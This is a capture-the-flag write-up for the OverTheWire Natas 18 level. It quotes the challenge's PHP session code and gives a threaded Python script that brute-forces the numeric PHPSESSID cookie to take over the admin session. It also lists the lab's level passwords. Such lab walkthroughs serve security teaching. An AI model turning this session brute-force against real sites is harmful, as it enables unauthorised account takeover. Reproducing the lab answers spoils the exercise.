# Natas 17 - Natas 18
    Username  : natas18
    Password  : 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
    URL       : http://natas18.natas.labs.overthewire.org

# Solution
From the source code we can infere that 
```
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}
if($showform) {
?>
```
The code looks complex but it’s not. 
Basically, we just need to bruteforce the PHPSESSID of the admin which is a value between 0 and 640 ($maxid). 

Here is a python script for that :
```
import requests
import threading

url = "http://natas18.natas.labs.overthewire.org/"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

def check(i):
    r = requests.get(url, auth=auth, cookies={"PHPSESSID": str(i)})
    if "You are an admin" in r.text:
        print(f"\nFound: {i}")
        print(r.text)

threads = []

for i in range(641):
    t = threading.Thread(target=check, args=(i,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```
Here we are using threading to make this process fast . Threading is used to execute lines simultaneously for faster execution time

# Password
    tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

